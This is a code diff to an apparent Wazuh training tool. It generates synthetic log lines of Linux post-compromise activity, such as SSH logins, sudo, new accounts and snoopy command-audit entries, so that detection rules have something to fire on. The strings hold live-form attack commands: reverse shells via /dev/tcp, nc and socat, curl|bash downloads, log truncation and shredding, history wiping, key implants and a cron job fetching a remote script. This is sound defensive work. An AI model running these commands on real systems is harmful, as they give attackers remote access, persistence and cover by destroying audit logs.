@@ -10,6 +10,23 @@ to carry data.srcip, so the attack map / triage sees a source) are included:
   web_traversal -> rule 31106                                     -> webattack
   web_cmdinj    -> rule 31106                                     -> webattack
 
+Linux post-compromise / assume-breach (adversary already inside — successful
+auth + on-host command activity rather than perimeter brute force):
+
+  linux_ssh_accepted -> rule 5715  (Accepted password, carries srcip+dstuser)
+  linux_ssh_pubkey   -> rule 5715  (Accepted publickey — stolen/implanted key)
+  linux_sudo_root    -> rule 5402/5403 (sudo to root; 5403 first-time)
+  linux_useradd      -> rule 5902  (new account — persistence)
+  linux_authkey      -> rule 100210 (authorized_keys implant)   T1098.004
+  linux_revshell     -> rule 100211 (reverse shell / C2)        T1059.004
+  linux_download_exec-> rule 100212 (curl|bash tool ingress)    T1105
+  linux_hist_wipe    -> rule 100213 (shell history wipe)        T1070.003
+  linux_log_tamper   -> rule 100214 (system log tampering)      T1070.002
+  linux_cron_persist -> rule 100215 (cron persistence)          T1053.003
+
+The post-exploitation templates emit `snoopy` command-audit lines (no stock
+rule exists for them); the training pack matches full_log with <match>.
+
 A message is: `1:[<agentid>] (<agentname>) any-><location>:<raw log line>`.
 Everything runs ON the Wazuh manager (the queue socket is a local UNIX socket).
 """
@@ -31,6 +48,7 @@ WIN_SERVICES = ["svc_sql", "svc_web", "svc_backup", "MSSQLSvc", "svc_share",
                 "svc_ldap", "svc_report", "http_svc"]
 
 _SECURE = "any->/var/log/secure"
+_AUTH = "any->/var/log/auth.log"
 _ACCESS = "any->/var/log/apache2/access.log"
 _WINEVT = "any->EventChannel"
 
@@ -102,6 +120,37 @@ def _line(template, ip, st=None, computer="host01"):
     if template == "web_cmdinj":
         return _ACCESS, '%s - - [%s] "GET /ping?host=127.0.0.1;wget+http://45.9.148.3/x.sh HTTP/1.1" 200 %d' % (
             ip, _apache_ts(), random.randint(400, 4000))
+
+    # ---- Linux post-compromise / assume-breach ---------------------------
+    # Adversary already inside via stolen creds / a valid session. Successful
+    # auth + privilege + command activity rather than perimeter brute force.
+    #   linux_ssh_accepted / _pubkey -> stock rule 5715 (auth success, srcip)
+    #   linux_sudo_root              -> stock rule 5402/5403 (sudo to root)
+    #   linux_useradd                -> stock rule 5902 (new account)
+    # Post-exploitation command activity has no reliable stock rule, so it is
+    # emitted as `snoopy` command-audit lines matched by the training pack
+    # (training_rules.xml 100209-100215). full_log carries the command the
+    # analyst must read.
+    luser = st.get("user") or random.choice(USERS)
+    if template == "linux_ssh_accepted":      # stolen-credential interactive login
+        return _SECURE, "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
+            _ts(), host, pid, luser, ip, port)
+    if template == "linux_ssh_pubkey":        # session via implanted / stolen key
+        return _SECURE, "%s %s sshd[%d]: Accepted publickey for %s from %s port %d ssh2: RSA SHA256:%s" % (
+            _ts(), host, pid, luser, ip, port,
+            "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789+/") for _ in range(43)))
+    if template == "linux_sudo_root":         # privilege escalation with valid creds
+        cmd = st.get("cmd") or "/bin/bash"
+        return _AUTH, "%s %s sudo:  %s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (
+            _ts(), host, luser, luser, cmd)
+    if template == "linux_useradd":           # persistence — rogue account
+        newu = st.get("newuser") or ("svc" + str(random.randint(10, 99)))
+        return _AUTH, "%s %s useradd[%d]: new user: name=%s, UID=%d, GID=%d, home=/home/%s, shell=/bin/bash" % (
+            _ts(), host, pid, newu, 1000 + random.randint(30, 90),
+            1000 + random.randint(30, 90), newu)
+    if template.startswith("linux_") and template not in (
+            "linux_ssh_accepted", "linux_ssh_pubkey", "linux_sudo_root", "linux_useradd"):
+        return _snoopy_line(template, luser, ip, st, host, pid)
 
     # ---- Windows Security channel (training_rules.xml 100110-100134) ----
     wuser = st.get("user") or random.choice(WIN_USERS)
@@ -183,6 +232,48 @@ def _line(template, ip, st=None, computer="host01"):
         return _sysmon(template, ip, st, computer, pid)
 
     raise ValueError("unknown template: %s" % template)
+
+
+def _snoopy_line(template, luser, ip, st, host, pid):
+    """Linux post-compromise command activity as a `snoopy` audit line.
+
+    snoopy(1) logs every executed command to authpriv; the syslog predecoder
+    extracts program_name=snoopy and the command lands in full_log, which the
+    training pack (100209-100215) matches with <match>. No stock decoder is
+    required, so these fire deterministically on any manager.
+    """
+    uid = 1000 + random.randint(0, 40)
+    cmd = st.get("cmd")
+    if not cmd:
+        if template == "linux_authkey":        # persistence — SSH key implant
+            cmd = "tee -a /home/%s/.ssh/authorized_keys" % luser
+        elif template == "linux_revshell":     # C2 — reverse shell
+            cmd = random.choice([
+                "bash -c bash -i >& /dev/tcp/%s/443 0>&1" % ip,
+                "mkfifo /tmp/f; nc %s 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1" % ip,
+                "socat TCP:%s:9001 EXEC:'bash -li',pty,stderr" % ip])
+        elif template == "linux_download_exec":  # tool ingress
+            cmd = random.choice([
+                "curl -s http://%s/x.sh | bash" % ip,
+                "wget -qO- http://%s/kit.sh | sh" % ip])
+        elif template == "linux_hist_wipe":    # defense evasion — history
+            cmd = random.choice([
+                "rm -f /home/%s/.bash_history" % luser,
+                "ln -sf /dev/null /home/%s/.bash_history" % luser,
+                "unset HISTFILE; history -c"])
+        elif template == "linux_log_tamper":   # defense evasion — logs
+            cmd = random.choice([
+                "truncate -s0 /var/log/auth.log",
+                "rm -f /var/log/wtmp /var/log/btmp",
+                "shred -u /var/log/secure"])
+        elif template == "linux_cron_persist":  # persistence — cron
+            cmd = random.choice([
+                "tee /etc/cron.d/apache-update",
+                "crontab -l | tee /tmp/c; echo '* * * * * curl -s http://%s/b|sh' | crontab -" % ip])
+        else:
+            raise ValueError("unknown linux template: %s" % template)
+    return _AUTH, "%s %s snoopy[%d]: [uid:%d sid:%d tty:(pts/0) cwd:/home/%s filename:/bin/bash]: %s" % (
+        _ts(), host, pid, uid, random.randint(1000, 9000), luser, cmd)
 
 
 def _sysmon(template, ip, st, computer, pid):
